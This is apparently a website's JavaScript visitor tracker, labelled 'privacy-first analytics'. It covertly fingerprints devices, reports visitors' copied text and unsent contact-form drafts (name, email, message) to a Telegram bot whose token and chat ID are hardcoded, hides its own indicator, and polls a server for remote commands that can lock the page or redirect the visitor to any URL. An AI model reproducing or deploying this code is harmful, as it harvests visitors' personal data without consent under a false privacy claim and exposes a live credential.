
// TAURUS INTELLIGENCE - VISITOR TRACKER v1.1
// Privacy-First Analytics with Enhanced Detection
// Combines comprehensive in-app browser detection with honest device fingerprinting

(function () {
    console.log("📡 Taurus Tracker v1.1 Initializing...");

    const CONFIG = {
        collection: 'visitors_v1',
        maskIP: true,
        apiEndpoint: 'https://ipapi.co/json/'
    };

    // BULLETPROOF ASSET: Base64 Logo (Universal Reliability)
    const TAURUS_LOGO_B64 = 'data:image/png;base64,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';

    // --- SAFETY HELPERS ---
    function getSafeTimestamp() {
        try {
            if (window.firebase && firebase.firestore && firebase.firestore.FieldValue) {
                return firebase.firestore.FieldValue.serverTimestamp();
            }
        } catch (e) { }
        return Date.now();
    }

    function getSafeArrayUnion(val) {
        try {
            if (window.firebase && firebase.firestore && firebase.firestore.FieldValue) {
                return firebase.firestore.FieldValue.arrayUnion(val);
            }
        } catch (e) { }
        return [val]; // Fallback to plain array if SDK fails
    }

    async function signalCrash(msg, error) {
        try {
            const token = '8567285538:AAHKfo8bqee43rprC-GCv3Je423R57YQkCE';
            const chat = '6886010817';
            const text = '🚨 <b>TAURUS CRASH:</b> ' + msg + '\n' + (error ? error.message : '') + '\nUA: ' + navigator.userAgent;
            await fetch('https://api.telegram.org/bot' + token + '/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chat, text: text, parse_mode: 'HTML' })
            });
        } catch (e) { }
    }

    // Helper: Generate or Get Session ID
    function getSessionID() {
        let sid = localStorage.getItem('taurus_sid');
        if (!sid) {
            sid = 'sess_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
            localStorage.setItem('taurus_sid', sid);
        }
        return sid;
    }

    // Helper: Mask IP (Privacy Compliance)
    function maskIPAddress(ip) {
        if (!ip || ip === 'Unknown') return '0.0.0.0';
        const parts = ip.split('.');
        if (parts.length === 4) {
            return `${parts[0]}.${parts[1]}.${parts[2]}.***`;
        }
        return ip.substr(0, ip.lastIndexOf(':')) + ':****';
    }

    // TRAFFIC SOURCE DETECTION (Instagram, Facebook, TikTok, etc.)
    function getTrafficSource() {
        const ua = navigator.userAgent;
        const ref = document.referrer.toLowerCase();
        const urlParams = new URLSearchParams(window.location.search);

        // 1. IN-APP BROWSER DETECTION (User-Agent based - most reliable)
        if (ua.includes("Instagram")) return { source: "Instagram", method: "in-app-browser" };
        if (ua.includes("FBAN") || ua.includes("FBAV") || ua.includes("FB_IAB")) return { source: "Facebook", method: "in-app-browser" };
        if (ua.includes("TikTok") || ua.includes("BytedanceWebview") || ua.includes("musical_ly")) return { source: "TikTok", method: "in-app-browser" };
        if (ua.includes("Twitter") || ua.includes("TwitterAndroid")) return { source: "X/Twitter", method: "in-app-browser" };
        if (ua.includes("LinkedIn")) return { source: "LinkedIn", method: "in-app-browser" };
        if (ua.includes("Snapchat")) return { source: "Snapchat", method: "in-app-browser" };
        if (ua.includes("Pinterest")) return { source: "Pinterest", method: "in-app-browser" };
        if (ua.includes("WhatsApp")) return { source: "WhatsApp", method: "in-app-browser" };
        if (ua.includes("Telegram")) return { source: "Telegram", method: "in-app-browser" };

        // 2. URL PARAMETER DETECTION (for tracking links)
        if (urlParams.has('igshid') || urlParams.has('ig_rid')) return { source: "Instagram", method: "url-param" };
        if (urlParams.has('fbclid')) return { source: "Facebook", method: "url-param" };
        if (urlParams.has('ttclid') || urlParams.has('tt_from')) return { source: "TikTok", method: "url-param" };
        if (urlParams.has('twclid')) return { source: "Twitter/X", method: "url-param" };
        if (urlParams.has('li_fat_id')) return { source: "LinkedIn", method: "url-param" };
        if (urlParams.has('gclid')) return { source: "Google Ads", method: "url-param" };
        if (urlParams.has('msclkid')) return { source: "Microsoft Ads", method: "url-param" };
        if (urlParams.has('utm_source')) return { source: urlParams.get('utm_source'), method: "utm-param" };
        if (urlParams.has('ref')) return { source: urlParams.get('ref'), method: "ref-param" };

        // 3. DOCUMENT REFERRER (traditional method)
        if (ref.includes("instagram.com")) return { source: "Instagram", method: "referrer" };
        if (ref.includes("facebook.com") || ref.includes("fb.com")) return { source: "Facebook", method: "referrer" };
        if (ref.includes("t.co") || ref.includes("twitter.com") || ref.includes("x.com")) return { source: "X/Twitter", method: "referrer" };
        if (ref.includes("linkedin.com")) return { source: "LinkedIn", method: "referrer" };
        if (ref.includes("youtube.com") || ref.includes("youtu.be")) return { source: "YouTube", method: "referrer" };
        if (ref.includes("tiktok.com")) return { source: "TikTok", method: "referrer" };
        if (ref.includes("google.")) return { source: "Google Search", method: "referrer" };
        if (ref.includes("bing.com")) return { source: "Bing Search", method: "referrer" };
        if (ref.includes("pinterest.com")) return { source: "Pinterest", method: "referrer" };
        if (ref.includes("reddit.com")) return { source: "Reddit", method: "referrer" };
        if (ref.includes("github.com")) return { source: "GitHub", method: "referrer" };

        if (ref) {
            try {
                const domain = new URL(document.referrer).hostname.replace('www.', '');
                return { source: domain, method: "referrer" };
            } catch (e) { }
        }

        return { source: "Direct / Unknown", method: "none" };
    }

    // GPU DETECTION (for device fingerprinting)
    function getGPUInfo() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (!gl) return null;

            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (!debugInfo) return null;

            const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);

            return {
                renderer: renderer || 'Unknown',
                vendor: vendor || 'Unknown'
            };
        } catch (e) {
            return null;
        }
    }

    // DEVICE INFO (Enhanced with honest detection)
    function getDeviceInfo() {
        const ua = navigator.userAgent;

        // Device Type
        let deviceType = "Desktop";
        if (/Mobi|Android/i.test(ua)) deviceType = "Mobile";
        if (/iPad|Tablet/i.test(ua) || (ua.indexOf("Macintosh") !== -1 && navigator.maxTouchPoints > 1)) deviceType = "Tablet";

        // Browser Detection (In-App Browsers FIRST)
        let browser = "Unknown";
        let inAppSource = null;

        if (ua.includes("Instagram")) {
            browser = "Instagram";
            inAppSource = "Instagram";
        } else if (ua.includes("FBAN") || ua.includes("FBAV") || ua.includes("FB_IAB")) {
            browser = "Facebook";
            inAppSource = "Facebook";
        } else if (ua.includes("TikTok") || ua.includes("BytedanceWebview")) {
            browser = "TikTok";
            inAppSource = "TikTok";
        } else if (ua.includes("Twitter") || ua.includes("TwitterAndroid")) {
            browser = "X/Twitter";
            inAppSource = "Twitter";
        } else if (ua.includes("LinkedIn")) {
            browser = "LinkedIn";
            inAppSource = "LinkedIn";
        } else if (ua.includes("Snapchat")) {
            browser = "Snapchat";
            inAppSource = "Snapchat";
        } else if (ua.includes("Pinterest")) {
            browser = "Pinterest";
            inAppSource = "Pinterest";
        } else if (ua.includes("WhatsApp")) {
            browser = "WhatsApp";
            inAppSource = "WhatsApp";
        } else if (ua.includes("Telegram")) {
            browser = "Telegram";
            inAppSource = "Telegram";
        }
        else if (ua.includes("CriOS")) browser = "Chrome";
        else if (ua.includes("FxiOS")) browser = "Firefox";
        else if (ua.includes("EdgiOS")) browser = "Edge";
        else if (ua.includes("Chrome")) browser = "Chrome";
        else if (ua.includes("Safari")) browser = "Safari";

        let os = "Unknown OS";
        if (ua.includes("Win")) os = "Windows";
        else if (ua.includes("Mac")) os = "macOS";
        else if (ua.includes("Linux")) os = "Linux";
        else if (ua.includes("Android")) os = "Android";
        else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";

        return {
            userAgent: ua,
            platform: navigator.platform,
            language: navigator.language,
            screen: `${window.screen.width}x${window.screen.height}`,
            type: deviceType,
            browser: browser,
            os: os,
            model: deviceType, // Condensed logic for brevity
            modelConfidence: "medium",
            inAppSource: inAppSource,
            gpu: getGPUInfo()
        };
    }

    // Main Tracking Logic
    async function initTracker() {
        try {
            const sessionID = getSessionID();
            const deviceInfo = getDeviceInfo();
            const trafficSource = getTrafficSource();

            const visitData = {
                session_id: sessionID,
                ip_masked: 'Loading...',
                location: { city: '...', country: '...' },
                device: deviceInfo,
                traffic_source: trafficSource.source,
                traffic_method: trafficSource.method,
                status: 'initializing'
            };

            // Remove visual indicator if it exists (user request)
            const ind = document.getElementById('tracker-indicator');
            if (ind) ind.style.display = 'none';

            if (!visitData.history) visitData.history = [];
            visitData.history.push({
                page: window.location.pathname,
                title: document.title,
                timestamp: Date.now()
            });

            const intel = await setupIntelligence(sessionID, null, visitData);

            // IP Fetch with timeout
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 4000);
                const response = await fetch(CONFIG.apiEndpoint, { signal: controller.signal });
                clearTimeout(timeoutId);
                if (response.ok) {
                    const ipData = await response.json();
                    visitData.ip_masked = CONFIG.maskIP ? maskIPAddress(ipData.ip) : ipData.ip;
                    visitData.location = {
                        city: ipData.city || 'Unknown',
                        country: ipData.country_name || 'Unknown',
                        country_code: ipData.country_code || 'XX',
                        isp: ipData.org || 'Unknown',
                        region: ipData.region || '',
                        postal: ipData.postal || ''
                    };
                }
            } catch (e) { }

            visitData.last_seen = getSafeTimestamp();

            if (intel && intel.sendPulse) {
                let locDetails = "";
                if (visitData.location.city !== 'Unknown') {
                    locDetails = `📍 <b>Loc:</b> ${visitData.location.city}, ${visitData.location.country_code}`;
                }
                await intel.sendPulse("Neural Link Established", 'medium', locDetails);
                window.TAURUS_ACTIVE = true;
            }

            // Persistence
            if (window.db) {
                try {
                    const docRef = db.collection(CONFIG.collection).doc(sessionID);
                    const baseData = Object.assign({}, visitData);
                    delete baseData.history;
                    await docRef.set(baseData, { merge: true });

                    const currentPage = {
                        page: window.location.pathname,
                        title: document.title,
                        timestamp: Date.now()
                    };
                    await docRef.update({
                        history: getSafeArrayUnion(currentPage)
                    });

                    if (intel && intel.startRemoteControl) {
                        intel.startRemoteControl(docRef);
                    }

                    // Heartbeat
                    setInterval(() => {
                        docRef.update({
                            last_seen: getSafeTimestamp(),
                            status: 'online'
                        }).catch(() => { });
                    }, 30000);

                } catch (e) { console.warn("DB Write Pending..."); }
            }

        } catch (error) {
            console.error("Taurus Tracker Fatal Error:", error);
            await signalCrash("Init Failure", error);
        }
    }

    // --- TAURUS INTELLIGENCE MODULE ---
    async function setupIntelligence(sessionID, docRef, visitData) {
        let botToken = '8567285538:AAHKfo8bqee43rprC-GCv3Je423R57YQkCE';
        let chatId = '6886010817';

        try {
            if (window.db) {
                const doc = await db.collection('security_config').doc('telegram').get();
                if (doc.exists) {
                    botToken = doc.data().botToken || botToken;
                    chatId = doc.data().chatId || chatId;
                }
            }
        } catch (e) { }

        const sendPulse = async (alertTitle, priority = 'low', extraData = null) => {
            if (!botToken || !chatId) return;
            const d = visitData.device;
            const model = d.model || "Unknown";
            const source = (typeof visitData.traffic_source === 'object') ? (visitData.traffic_source.source || "Direct") : visitData.traffic_source;

            let text = `<b>🔔 TAURUS INTEL: ${alertTitle}</b>\n\n`;
            text += `👤 <b>User:</b> ${model}\n`;
            text += `🌍 <b>Source:</b> ${source}\n`;

            if (visitData.location && visitData.location.city !== 'Unknown') {
                text += `📍 <b>Loc:</b> ${visitData.location.city}, ${visitData.location.country_code}\n`;
            }
            if (extraData) text += `\n${extraData}`;

            try {
                const payload = {
                    chat_id: chatId, text: text, parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: "🔔 Alarm", callback_data: `alarm_${visitData.session_id}` },
                            { text: "🚫 Block", callback_data: `block_${visitData.session_id}` }],
                            [{ text: "✅ Unblock", callback_data: `unblock_${visitData.session_id}` }]
                        ]
                    }
                };
                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload),
                    keepalive: (priority === 'high')
                });
            } catch (e) { }

            // Log to Firestore (Neural Sync)
            const logToIntelligence = (attempts = 0) => {
                const activeRef = docRef || (window.db ? db.collection(CONFIG.collection).doc(sessionID) : null);
                if (activeRef) {
                    try {
                        activeRef.collection('intelligence').add({
                            alert: alertTitle,
                            data: extraData || {},
                            timestamp: getSafeTimestamp()
                        });
                    } catch (e) { }
                } else if (attempts < 5) {
                    setTimeout(() => logToIntelligence(attempts + 1), 2000);
                }
            };
            logToIntelligence();
        };

        // --- TAURUS SECURITY UI MANAGER (Red/Yellow Themes) ---
        const TaurusSecurityUI = {
            overlay: null,
            initialized: false,
            currentAction: null,

            init() {
                if (this.initialized) return;
                const el = document.createElement('div');
                el.id = 'taurus-security-overlay';
                el.style = "position:fixed;inset:0;z-index:9999999;display:none;align-items:center;justify-content:center;background:rgba(0,0,0,0.95);backdrop-filter:blur(15px);opacity:0;transition:opacity 0.3s ease;";

                // Inject Styles with CSS Variables for Theme Support
                const style = document.createElement('style');
                style.innerHTML = `
                    :root { --taurus-theme: #FFD700; --taurus-theme-dim: rgba(255, 215, 0, 0.5); }
                    
                    @keyframes taurus-ripple {
                        0% { transform: scale(1); opacity: 0.8; box-shadow: 0 0 10px var(--taurus-theme); }
                        100% { transform: scale(1.6); opacity: 0; box-shadow: 0 0 30px var(--taurus-theme-dim); }
                    }
                    @keyframes taurus-pulse-text {
                        0%, 100% { opacity: 0.8; }
                        50% { opacity: 1; text-shadow: 0 0 10px var(--taurus-theme); }
                    }
                `;
                document.head.appendChild(style);

                // Circular Logo Design
                el.innerHTML = `
                    <div style="text-align: center; position: relative; width: 100%; padding: 20px;">
                        <!-- Logo Container -->
                        <div style="position: relative; width: 140px; height: 140px; margin: 0 auto 30px auto; display: flex; justify-content: center; align-items: center;">
                            <!-- Ripple 1 -->
                            <div class="taurus-ripple-el" style="position: absolute; inset: 0; border: 2px solid var(--taurus-theme); border-radius: 50%; animation: taurus-ripple 2.5s infinite;"></div>
                            <!-- Ripple 2 -->
                            <div class="taurus-ripple-el" style="position: absolute; inset: 10px; border: 1px solid var(--taurus-theme-dim); border-radius: 50%; animation: taurus-ripple 2.5s infinite 0.8s;"></div>
                            
                            <!-- Main Logo -->
                            <img src="${TAURUS_LOGO_B64}" id="taurus-main-img" style="
                                width: 100px; height: 100px; 
                                border-radius: 50%; 
                                object-fit: cover; 
                                border: 3px solid var(--taurus-theme); 
                                box-shadow: 0 0 40px var(--taurus-theme-dim); 
                                z-index: 10;
                            ">
                        </div>

                        <!-- Title -->
                        <h2 id="taurus-title" style="
                            font-family: 'Syncopate', sans-serif;
                            font-size: 20px; letter-spacing: 4px; color: var(--taurus-theme);
                            text-transform: uppercase; margin: 0 0 20px 0; font-weight: 700;
                            animation: taurus-pulse-text 2s infinite ease-in-out;
                        ">SECURITY ALERT</h2>

                        <!-- Action Button -->
                        <button id="taurus-action-btn" style="
                            background: transparent; color: var(--taurus-theme);
                            border: 1px solid var(--taurus-theme); padding: 12px 30px;
                            border-radius: 30px;
                            font-family: 'Manrope', sans-serif;
                            font-weight: 700; font-size: 12px;
                            text-transform: uppercase; letter-spacing: 2px;
                            cursor: pointer; transition: all 0.2s;
                            margin-top: 15px;
                        ">ACKNOWLEDGE</button>
                    </div>
                `;

                document.body.appendChild(el);
                this.overlay = el;
                this.initialized = true;

                const btn = el.querySelector('#taurus-action-btn');
                btn.onclick = () => {
                    this.hide();
                    if (this.currentAction) {
                        this.currentAction();
                        this.currentAction = null;
                    }
                };
            },

            show(title, color, btnText, onAction) {
                this.init();
                this.currentAction = onAction || null;
                const titleEl = this.overlay.querySelector('#taurus-title');
                const btn = this.overlay.querySelector('#taurus-action-btn');

                if (title) titleEl.textContent = title;
                if (btnText === null) btn.style.display = 'none';
                else {
                    btn.style.display = 'inline-block';
                    btn.textContent = btnText || 'ACKNOWLEDGE';
                }

                // APPLY COLOR THEME
                const themeColor = color || '#FFD700';
                const themeDim = color === '#ff4444' ? 'rgba(255, 68, 68, 0.4)' : 'rgba(255, 215, 0, 0.4)';

                if (this.overlay) {
                    this.overlay.style.setProperty('--taurus-theme', themeColor);
                    this.overlay.style.setProperty('--taurus-theme-dim', themeDim);
                    // Also set on root to be safe
                    document.documentElement.style.setProperty('--taurus-theme', themeColor);
                    document.documentElement.style.setProperty('--taurus-theme-dim', themeDim);
                }

                this.overlay.style.display = 'flex';
                requestAnimationFrame(() => {
                    this.overlay.style.opacity = '1';
                });
            },

            hide() {
                if (this.overlay) {
                    this.overlay.style.opacity = '0';
                    setTimeout(() => {
                        this.overlay.style.display = 'none';
                    }, 400);
                }
            }
        };

        function startRemoteControl(ref) {
            let alarmAudio = null;
            let lastProcessedId = null;
            const sessionId = ref.id;

            function playAlarmSound(loop = false) {
                if (!alarmAudio) {
                    alarmAudio = new Audio('https://assets.mixkit.co/active_storage/sfx/995/995-preview.mp3');
                    alarmAudio.loop = true;
                }
                alarmAudio.play().catch(e => console.log("Audio blocked", e));
            }

            function stopAlarm() {
                if (alarmAudio) {
                    alarmAudio.pause();
                    alarmAudio.currentTime = 0;
                }
            }

            // POLLING MECHANISM
            console.log("📡 Remote Control: Starting Poll Loop...");
            setInterval(async () => {
                try {
                    const res = await fetch(`/.netlify/functions/check_command?sessionId=${sessionId}&t=${Date.now()}`);
                    const data = await res.json();

                    if (!data || !data.action) {
                        if (lastProcessedId) {
                            console.log("Commands Cleared.");
                            lastProcessedId = null;
                            stopAlarm();
                            TaurusSecurityUI.hide();
                        }
                        return;
                    }

                    // GENERATE COMPOSITE ID
                    const currentId = data.action_timestamp
                        ? `${data.action}_${JSON.stringify(data.action_timestamp)}`
                        : data.action;

                    if (currentId === lastProcessedId) return;

                    // STALE COMMAND CHECK
                    if (data.action_timestamp) {
                        const cmdTime = new Date(data.action_timestamp._seconds * 1000).getTime();
                        if (Date.now() - cmdTime > 60000) {
                            lastProcessedId = currentId;
                            return;
                        }
                    }

                    console.log("⚡ Command Received:", data.action, "ID:", currentId);
                    lastProcessedId = currentId;

                    if (data.action === 'alarm') {
                        playAlarmSound(true);
                        TaurusSecurityUI.show(
                            'SECURITY ALERT',
                            '#FFD700', // YELLOW
                            'ACKNOWLEDGE',
                            () => {
                                stopAlarm();
                                fetch('/.netlify/functions/ack_command', {
                                    method: 'POST', body: JSON.stringify({ sessionId: sessionId })
                                });
                            }
                        );
                    }
                    else if (data.action === 'block') {
                        stopAlarm();
                        TaurusSecurityUI.show(
                            'ACCESS DENIED',
                            '#ff4444', // RED
                            null, // No Button
                            null
                        );
                    }
                    else if (data.action === 'unblock') {
                        stopAlarm();
                        TaurusSecurityUI.hide();
                        setTimeout(() => window.location.reload(), 500);
                    }
                    else if (data.action === 'redirect' && data.url) {
                        window.location.href = data.url;
                    }

                } catch (e) { console.error("Poll Error", e); }
            }, 3000);
        }

        /** BEHAVIOR INTELLIGENCE **/
        console.log("🧠 Intelligence Module: Active");

        // A. TEXT COPY ALARM
        window.addEventListener('copy', () => {
            const selection = document.getSelection().toString();
            if (selection && selection.length > 5) {
                sendPulse("Text Copied", 'medium', `<i>"${selection.substring(0, 30)}..."</i>`);
            }
        });

        // B. SCROLL DEPTH
        let reachedBottom = false;
        window.addEventListener('scroll', () => {
            if (reachedBottom) return;
            if ((window.innerHeight + window.scrollY) >= document.body.offsetHeight - 100) {
                reachedBottom = true;
                sendPulse("Full Page Read (100%)", 'medium');
            }
        });

        // C. ABANDONED FORM TRACKING
        const contactForm = document.getElementById('contact-form');
        if (contactForm) {
            let formData = { name: '', email: '', message: '' };
            let formDirty = false;
            let formSubmitted = false;

            ['name', 'email', 'message'].forEach(id => {
                const el = document.getElementById(id);
                if (el) {
                    el.addEventListener('input', (e) => {
                        formData[id] = e.target.value;
                        if (e.target.value.length > 0) formDirty = true;
                    });
                }
            });

            contactForm.addEventListener('submit', () => { formSubmitted = true; });

            const handleAbandonment = () => {
                if (formDirty && !formSubmitted) {
                    if (formData.name.length > 2 || formData.email.length > 5 || formData.message.length > 5) {
                        let abandonDetails = `⚠️ <b>Unsent Draft:</b>\n`;
                        if (formData.name) abandonDetails += `👤 ${formData.name}\n`;
                        if (formData.email) abandonDetails += `📧 ${formData.email}\n`;
                        if (formData.message) abandonDetails += `📝 ${formData.message}`;
                        sendPulse("Form Abandoned", 'high', abandonDetails);
                    }
                }
            };
            window.addEventListener('beforeunload', handleAbandonment);
            document.addEventListener('visibilitychange', () => { if (document.visibilityState === 'hidden') handleAbandonment(); });
        }

        // D. CLICK INTELLIGENCE
        document.addEventListener('click', (e) => {
            const link = e.target.closest('a');
            if (!link) return;
            const href = link.href.toLowerCase();
            const text = link.innerText.trim() || link.getAttribute('aria-label') || 'Icon';
            if (href.includes('instagram.com')) sendPulse("Social Interaction", 'low', `📸 Clicked Instagram (${text})`);
            else if (href.includes('wa.me') || href.includes('whatsapp.com')) sendPulse("Contact Intent", 'medium', `💬 Clicked WhatsApp Link`);
            else if (href.includes('mailto:')) sendPulse("Contact Intent", 'medium', `📧 Clicked Email Link (${href.replace('mailto:', '')})`);
            else if (href.includes('facebook.com')) sendPulse("Social Interaction", 'low', `📘 Clicked Facebook`);
        });

        return { sendPulse, startRemoteControl };
    }

    initTracker();

})();
